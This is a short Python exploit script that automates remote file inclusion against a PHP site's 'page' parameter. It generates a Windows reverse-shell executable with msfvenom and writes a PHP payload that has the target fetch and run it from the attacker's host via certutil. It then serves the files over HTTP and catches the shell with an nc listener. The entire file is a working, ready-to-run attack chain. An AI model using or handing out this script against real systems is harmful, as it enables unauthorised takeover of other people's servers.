#!/usr/bin/python3
# PHP /SITE RCE -> REVERSE SHELL EXPLOIT
# by. j3ss1
# Twitter: @jessitakes
# Github: github.com/jessisec
# Usage: python3 site2shell.py target lhost

import threading
import os
import requests
import sys

target = sys.argv[1]
lhost = sys.argv[2]

# Create Shellcode
print("Creating Shellcode...")
os.system("msfvenom -p windows/shell_reverse_tcp lhost=" + lhost+" lport=443 -f exe -o shell.exe >/dev/null 2>&1")

# Create PHP Payload
print("Creating PHP Payload...")
f = open("pwn.php", "w+")
f.write("<?php\n")
f.write("$exec = system('certutil.exe -urlcache -f http://" + lhost+"/shell.exe shell.exe && shell.exe', $val);\n")
f.write("?>\n")
f.close()

# Payload Server
print("Configuring Payload Server...")
def serve_payload():
    os.system('python3 -m http.server 80 >/dev/null 2>&1')
def setup_http():
    threading.Thread(target=serve_payload).start()

# Exploit Stager
print("Configuring Stager...")
def stager():
    url = 'http://' + target+':8080/site/index.php?page=http://' + lhost+'/pwn.php'
    requests.get(url)
def setup_stager():
    threading.Thread(target=stager).start()

# Shell Listener
print("Configuring Listener...")
def listener():
    os.system("nc -lvnp 443")

# Launch Exploit!
print("Launching Exploit!")

# Define Exploit Method
def exploit():
    setup_http()
    setup_stager()
    listener()

# Run!
exploit()
